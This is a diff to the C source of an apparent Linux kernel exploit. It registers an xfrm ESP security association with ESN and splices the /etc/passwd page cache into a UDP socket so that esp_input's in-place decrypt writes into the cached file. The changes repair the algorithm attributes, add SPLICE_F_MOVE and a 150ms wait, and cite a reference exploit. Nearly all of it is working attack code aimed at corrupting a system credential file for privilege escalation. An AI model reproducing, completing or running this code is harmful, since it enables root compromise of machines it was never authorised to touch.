@@ -242,25 +242,46 @@ static bool xfrm_register_sa(int nl, const unsigned char seq_hi[4])
     usa->reqid     = 0x1234;
     usa->family    = AF_INET;
     usa->mode      = XFRM_MODE_TRANSPORT;
-    usa->replay_window = 32;
+    usa->replay_window = 0;       /* SA-level: 0; ESN-level (below): 32 */
     usa->flags     = XFRM_STATE_ESN;
 
     size_t hdrlen = sizeof(*nlh) + sizeof(*usa);
     size_t attrs  = 0;
     char   *abuf  = buf + hdrlen;
 
-    /* XFRMA_ALG_AEAD: 64-byte alg_name + u32 alg_key_len + key */
-    {
-        struct xfrm_algo_aead *aead;
-        unsigned short dlen = sizeof(*aead) + 32; /* zero key, 256-bit */
+    /*
+     * The kernel's xfrm code does NOT accept `authencesn(...)` as a
+     * single XFRMA_ALG_AEAD attribute — it's a composition that has
+     * to be assembled from separate auth + crypt parts. We register:
+     *   XFRMA_ALG_AUTH_TRUNC : hmac(sha256) with 32-byte key, 128-bit ICV
+     *   XFRMA_ALG_CRYPT      : cbc(aes)     with 16-byte key
+     *
+     * The kernel internally wires these into authencesn(hmac(sha256),
+     * cbc(aes)) when it sees XFRM_STATE_ESN on the SA.
+     */
+    {  /* XFRMA_ALG_AUTH_TRUNC */
+        struct xfrm_algo_auth *aa;
+        unsigned short dlen = sizeof(*aa) + 32;   /* HMAC-SHA256 key */
         struct rtattr *r = (struct rtattr *)(abuf + attrs);
-        r->rta_type = XFRMA_ALG_AEAD;
+        r->rta_type = XFRMA_ALG_AUTH_TRUNC;
         r->rta_len  = RTA_LENGTH(dlen);
-        aead = (struct xfrm_algo_aead *)RTA_DATA(r);
-        memset(aead, 0, dlen);
-        strncpy(aead->alg_name, ALG_NAME, sizeof(aead->alg_name) - 1);
-        aead->alg_key_len = 32 * 8;
-        aead->alg_icv_len = 128;
+        aa = (struct xfrm_algo_auth *)RTA_DATA(r);
+        memset(aa, 0, dlen);
+        strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name) - 1);
+        aa->alg_key_len   = 32 * 8;   /* bits */
+        aa->alg_trunc_len = 128;      /* bits — truncated MAC width */
+        attrs += RTA_SPACE(dlen);
+    }
+    {  /* XFRMA_ALG_CRYPT */
+        struct xfrm_algo *ea;
+        unsigned short dlen = sizeof(*ea) + 16;   /* AES-128 key */
+        struct rtattr *r = (struct rtattr *)(abuf + attrs);
+        r->rta_type = XFRMA_ALG_CRYPT;
+        r->rta_len  = RTA_LENGTH(dlen);
+        ea = (struct xfrm_algo *)RTA_DATA(r);
+        memset(ea, 0, dlen);
+        strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name) - 1);
+        ea->alg_key_len = 16 * 8;
         attrs += RTA_SPACE(dlen);
     }
 
@@ -397,13 +418,13 @@ static bool trigger_store(off_t passwd_off)
     }
     /* splice 16 bytes of /etc/passwd page cache from offset passwd_off. */
     loff_t off = passwd_off;
-    if (splice(pfd, &off, p[1], NULL, 16, 0) != 16) {
+    if (splice(pfd, &off, p[1], NULL, 16, SPLICE_F_MOVE) != 16) {
         log_bad("splice file->pipe: %s", strerror(errno));
         close(p[0]); close(p[1]); close(pfd);
         close(udp_recv); close(udp_send); return false;
     }
     /* splice the whole 40-byte payload from pipe to udp_send. */
-    if (splice(p[0], NULL, udp_send, NULL, 24 + 16, 0) != 40) {
+    if (splice(p[0], NULL, udp_send, NULL, 24 + 16, SPLICE_F_MOVE) != 40) {
         log_bad("splice pipe->udp: %s", strerror(errno));
         close(p[0]); close(p[1]); close(pfd);
         close(udp_recv); close(udp_send); return false;
@@ -412,7 +433,14 @@ static bool trigger_store(off_t passwd_off)
 
     /* Drive the receive — esp_input runs inline here, performs the
      * scratch-write, and we don't really care about the actual recv
-     * data (auth will fail with EBADMSG). */
+     * data (auth will fail with EBADMSG).
+     *
+     * The usleep gives the kernel a hard guarantee that the in-place
+     * decrypt has finished and the page-cache STORE is visible before
+     * we tear down the sockets. On a busy or slow VM, splice() can
+     * return before esp_input has actually fired. V4bel's reference
+     * exploit uses the same 150ms wait. */
+    usleep(150 * 1000);
     unsigned char drain[256];
     (void)recv(udp_recv, drain, sizeof(drain), MSG_DONTWAIT);
 
